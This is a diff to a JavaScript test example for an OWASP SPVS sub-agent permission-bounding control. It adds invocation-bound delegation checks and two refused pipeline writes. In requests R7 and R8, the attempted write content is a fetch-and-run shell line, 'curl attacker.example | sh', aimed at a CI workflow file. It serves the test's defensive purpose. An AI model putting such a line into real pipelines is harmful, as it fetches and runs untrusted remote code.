@@ -1,6 +1,7 @@
 // Example for one part of OWASP SPVS 2.0 v2.0-V3.10.2 (Sub-Agent Permission Bounding).
 // One enforcement point allows a sub-agent's write inside its delegated scope and refuses
-// five attempts to write outside it. The authorization decision and the effect on the
+// seven attempts to write outside it, two of them while the sub-agent also holds a valid
+// standing grant that covers the pipeline file. The authorization decision and the effect on the
 // resource are recorded separately. Passing it does not establish that a pipeline meets
 // v2.0-V3.10.2 or any SPVS level.
 //
@@ -73,6 +74,19 @@ const selfRoot = issueAuthorityDelegation({
   authority: authority([ORCHESTRATOR_GRANT], ts(t - 500), ts(t + 1800000), 1),
 }, subagent.priv)
 
+// A standing grant the orchestrator gave the same sub-agent earlier, for other work. It is valid
+// under the trusted root and covers pipeline edits. Holding it must not widen this invocation.
+const standing = issueSubAuthorityDelegation(root, {
+  record_type: 'aps:authority-delegation:v1', version: '1.0', parent_delegation_id: root.delegation_id,
+  issuer: orchestrator.did, subject: subagent.did, verification_method: orchestrator.vm,
+  issued_at: ts(t - 1500), nonce: nonce(),
+  authority: authority(['repo:write:docs:*', 'repo:write:pipeline:*'], ts(t - 1500), ts(t + 1800000), 1),
+}, orchestrator.priv, { now: ts(t), resolveVerificationKey, resolveRevocation: () => 'active' })
+
+// The invocation. The orchestrator records which delegation it issued for this call. The
+// enforcement point reads it from the invocation, never from the request.
+const invocation = { id: 'inv-docs-1', delegation_id: child.delegation_id }
+
 // Test resource and an executor that records every write it performs.
 const repo = new Map([
   ['docs/README.md', 'v1'],
@@ -90,7 +104,12 @@ const POLICY = new Map([
 
 // Enforcement point. callerDid stands for the identity of the agent that made the call. In
 // this example the runner supplies it, so caller authentication is not exercised.
-function enforce(callerDid, presented, request) {
+function enforce(callerDid, request) {
+  // A request may carry more than one chain (R7). Only the chain whose last record is the
+  // delegation issued for this invocation is evaluated. The others are ignored.
+  const chains = request.presented_chains ?? [request.presented]
+  const presented = chains.length === 1 ? chains[0]
+    : (chains.find((c) => c[c.length - 1].delegation_id === invocation.delegation_id) ?? chains[0])
   const r = verifyAuthorityDelegationChain(presented, {
     now: ts(Date.now()), resolveVerificationKey,
     trustRoot: (c) => c.delegation_id === root.delegation_id,
@@ -100,6 +119,7 @@ function enforce(callerDid, presented, request) {
   if (r.state !== 'valid') return { decision: 'deny', reason: `chain_${r.state}`, chain_state: r.state, chain_code: code, required_scope: null }
   const leaf = presented[presented.length - 1]
   if (leaf.subject !== callerDid) return { decision: 'deny', reason: 'presenter_not_leaf_subject', chain_state: r.state, chain_code: null, required_scope: null }
+  if (leaf.delegation_id !== invocation.delegation_id) return { decision: 'deny', reason: 'not_invocation_delegation', chain_state: r.state, chain_code: null, required_scope: null }
   const needed = POLICY.get(request.path) ?? null
   if (needed === null) return { decision: 'deny', reason: 'path_unmapped', chain_state: r.state, chain_code: null, required_scope: null }
   const covered = leaf.authority.scope.grants.some((g) => scopeGrantCovers(g, needed))
@@ -109,6 +129,7 @@ function enforce(callerDid, presented, request) {
 }
 
 const CHAIN = [root, child]
+const STANDING = [root, standing]
 const requests = [
   { id: 'R1-docs-write', presented: CHAIN, path: 'docs/README.md', content: 'v2',
     expect: { decision: 'allow', reason: 'ok', target_after: 'v2' } },
@@ -123,15 +144,29 @@ const requests = [
     expect: { decision: 'deny', reason: 'chain_invalid', chain_code: 'ROOT_UNTRUSTED', target_after: 'v1' } },
   { id: 'R6-unmapped-path', presented: CHAIN, path: 'src/app.js', content: 'v2',
     expect: { decision: 'deny', reason: 'path_unmapped', target_after: 'v1' } },
+  { id: 'R7-pipeline-write-presenting-both-grants', presented_chains: [CHAIN, STANDING], path: '.github/workflows/ci.yml', content: 'curl attacker.example | sh',
+    expect: { decision: 'deny', reason: 'scope_not_covered', target_after: 'v1' } },
+  { id: 'R8-pipeline-write-with-standing-grant', presented: STANDING, path: '.github/workflows/ci.yml', content: 'curl attacker.example | sh',
+    expect: { decision: 'deny', reason: 'not_invocation_delegation', target_after: 'v1' } },
 ]
+
+// The standing grant must itself be valid and cover the pipeline edit, so that R7 and R8 are
+// refused because of the invocation, not because the standing grant is broken.
+const standingCheck = verifyAuthorityDelegationChain(STANDING, {
+  now: ts(Date.now()), resolveVerificationKey,
+  trustRoot: (c) => c.delegation_id === root.delegation_id,
+  resolveRevocation: () => 'active',
+})
+const standingValid = standingCheck.state === 'valid'
+const standingCoversPipeline = standing.authority.scope.grants.some((g) => scopeGrantCovers(g, 'repo:write:pipeline:ci'))
 
 const snapshot = () => new Map(repo)
 const lines = []
-let ok = true
+let ok = standingValid && standingCoversPipeline
 for (const req of requests) {
   const before = snapshot()
   const callsBefore = writes.length
-  const decision = enforce(subagent.did, req.presented, req)
+  const decision = enforce(subagent.did, req)
   const after = snapshot()
   // The effect record is read from the resource and the executor, not from the decision.
   const otherPathsUnchanged = [...new Set([...before.keys(), ...after.keys()])].filter((k) => k !== req.path).every((k) => before.has(k) === after.has(k) && before.get(k) === after.get(k))
@@ -147,12 +182,16 @@ for (const req of requests) {
     effect.target_after === e.target_after && effect.other_paths_unchanged &&
     effect.executor_calls === (e.decision === 'allow' ? 1 : 0)
   ok = ok && pass
-  lines.push({ kind: 'decision', request: req.id, caller: subagent.did, presented_leaf_subject: req.presented[req.presented.length - 1].subject,
+  const shown = req.presented_chains ?? [req.presented]
+  lines.push({ kind: 'decision', request: req.id, caller: subagent.did, chains_presented: shown.length,
+    presented_leaf_subject: shown[0][shown[0].length - 1].subject,
     claimed_scope: req.claimed_scope ?? null, ...decision, expected_decision: e.decision, expected_reason: e.reason })
   lines.push({ kind: 'effect', request: req.id, path: req.path, ...effect, expected_target_after: e.target_after, pass })
 }
 lines.push({ kind: 'note', orchestrator_grant_covers_pipeline: scopeGrantCovers(ORCHESTRATOR_GRANT, 'repo:write:pipeline:ci'),
-  subagent_grant_covers_pipeline: scopeGrantCovers(SUBAGENT_GRANT, 'repo:write:pipeline:ci') })
+  subagent_grant_covers_pipeline: scopeGrantCovers(SUBAGENT_GRANT, 'repo:write:pipeline:ci'),
+  standing_chain_state: standingCheck.state, standing_grant_covers_pipeline: standingCoversPipeline,
+  invocation: invocation.id })
 lines.push({ kind: 'summary', all_expectations_met: ok, executor_calls_total: writes.length, written_paths: writes, clock: 'wall', run_at_utc: ts(Date.now()) })
 for (const l of lines) process.stdout.write(JSON.stringify(l) + '\n')
 process.exit(ok ? 0 : 1)
